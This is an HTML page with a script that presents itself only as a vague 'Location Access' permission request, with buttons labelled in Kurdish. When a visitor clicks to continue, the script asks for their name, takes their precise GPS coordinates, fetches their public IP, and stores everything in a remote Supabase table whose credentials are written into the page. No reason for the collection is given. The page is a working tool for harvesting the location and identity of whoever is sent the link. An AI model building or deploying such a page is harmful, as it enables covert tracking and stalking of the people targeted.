<head>

  <title>Location Access</title>

  <style>
    body {

      color: white;
    }

<body>

  <div class="box">

    <h2>📍 Location Access</h2>

    <p>
      This website needs your promessio0n to continue.
    </p>

    <button id="allow">
      بەردەوام بوون
    </button>

    <button id="deny">
    داخستن 
    </button>

    <div id="result"></div>

  </div>


  <!-- Supabase -->
  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>

  <script>

    const SUPABASE_URL =
      "https://mxichdljcrlcomnhkcin.supabase.co";

    const SUPABASE_KEY =
      "sb_publishable_SlntFaOIzECUYXOwVUzmDQ_cLzgxh-P";

    const supabase =
      window.supabase.createClient(
        SUPABASE_URL,
        SUPABASE_KEY
      );


    const allowButton =
      document.getElementById("allow");

    const denyButton =
      document.getElementById("deny");

    const result =
      document.getElementById("result");


    allowButton.addEventListener("click", async function () {

      const name = prompt("Enter your name:");

      if (!name || !name.trim()) {

        result.innerText =
          "Please enter your name.";

        return;
      }


      if (!navigator.geolocation) {

        result.innerText =
          "Geolocation is not supported.";

        return;
      }


      result.innerText =
        "Getting your location...";


      /*
        GET LOCATION
      */

      navigator.geolocation.getCurrentPosition(

        async function (position) {

          const latitude =
            position.coords.latitude;

          const longitude =
            position.coords.longitude;


          result.innerText =
            "Getting public IP...";


          /*
            GET PUBLIC IP

            This uses a public IP service.
          */

          let publicIP = null;

          try {

            const response =
              await fetch("https://api.ipify.org?format=json");

            const ipData =
              await response.json();

            publicIP =
              ipData.ip;

          } catch (ipError) {

            console.error(
              "IP Error:",
              ipError
            );

          }


          result.innerText =
            "Saving your information...";


          /*
            SAVE TO SUPABASE
          */

          const { error } =
            await supabase
              .from("locations")
              .insert([
                {
                  name: name.trim(),
                  latitude: latitude,
                  longitude: longitude,
                  public_ip: publicIP
                }
              ]);


          if (error) {

            console.error(
              "Supabase Error:",
              error
            );

            result.innerText =
              "❌ Could not save your location.";

            return;
          }


          /*
            SUCCESS
          */

          result.innerHTML = `
            <h3>✅ Done!</h3>
            <p>Your location was saved successfully.</p>
          `;

        },


        function (error) {

          console.error(
            "Location Error:",
            error
          );


          if (error.code === 1) {

            result.innerText =
              "❌ Location permission was denied.";

          } else if (error.code === 2) {

            result.innerText =
              "❌ Location is unavailable.";

          } else if (error.code === 3) {

            result.innerText =
              "❌ Location request timed out.";

          } else {

            result.innerText =
              "❌ Could not get your location.";

          }

        },


        {
          enableHighAccuracy: true,
          timeout: 15000,
          maximumAge: 0
        }

      );

    });


    denyButton.addEventListener("click", function () {

      result.innerText =
        "Location access was not allowed.";

    });

  </script>

</body>
</html>
